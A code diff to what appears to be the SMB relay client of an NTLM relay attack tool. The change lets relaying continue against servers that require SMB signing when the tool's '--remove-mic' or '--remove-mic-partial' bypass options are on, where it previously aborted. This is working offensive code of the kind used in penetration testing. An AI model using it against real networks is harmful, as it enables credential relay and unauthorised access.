@@ -57,8 +57,9 @@ class MYSMB(SMB):
         return SMB.neg_session(self, extended_security=self.extendedSecurity, negPacket=negPacket)
 
 class MYSMB3(SMB3):
-    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None, preferredDialect=None):
+    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None, preferredDialect=None, serverConfig=None):
         self.extendedSecurity = extendedSecurity
+        self.serverConfig = serverConfig
         SMB3.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negSessionResponse=SMB2Packet(negPacket), preferredDialect=preferredDialect)
 
     def negotiateSession(self, preferredDialect = None, negSessionResponse = None):
@@ -66,8 +67,10 @@ class MYSMB3(SMB3):
         self._Connection['ClientSecurityMode'] = 0
 
         if self.RequireMessageSigning is True:
-            LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic / --remove-mic-partial')
-            return
+            # Allow connection if using --remove-mic or --remove-mic-partial exploits
+            if self.serverConfig is None or (not self.serverConfig.remove_mic and not self.serverConfig.remove_mic_partial):
+                LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic / --remove-mic-partial')
+                return
 
         self._Connection['Capabilities'] = SMB2_GLOBAL_CAP_ENCRYPTION
         currentDialect = SMB2_DIALECT_WILDCARD
@@ -107,8 +110,10 @@ class MYSMB3(SMB3):
         self._Connection['GSSNegotiateToken'] = negResp['Buffer']
         self._Connection['Dialect']           = negResp['DialectRevision']
         if (negResp['SecurityMode'] & SMB2_NEGOTIATE_SIGNING_REQUIRED) == SMB2_NEGOTIATE_SIGNING_REQUIRED:
-            LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic / --remove-mic-partial')
-            return
+            # Allow connection if using --remove-mic or --remove-mic-partial exploits
+            if self.serverConfig is None or (not self.serverConfig.remove_mic and not self.serverConfig.remove_mic_partial):
+                LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic / --remove-mic-partial')
+                return
         if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LEASING) == SMB2_GLOBAL_CAP_LEASING:
             self._Connection['SupportsFileLeasing'] = True
         if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LARGE_MTU) == SMB2_GLOBAL_CAP_LARGE_MTU:
@@ -292,7 +297,7 @@ class SMBRelayClient(ProtocolClient):
             if self.serverConfig.remove_target:
                 preferredDialect = SMB2_DIALECT_21
             smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
-                               negPacket=packet, preferredDialect=preferredDialect)
+                               negPacket=packet, preferredDialect=preferredDialect, serverConfig=self.serverConfig)
         else:
             # Answer is SMB packet, sticking to SMBv1
             smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
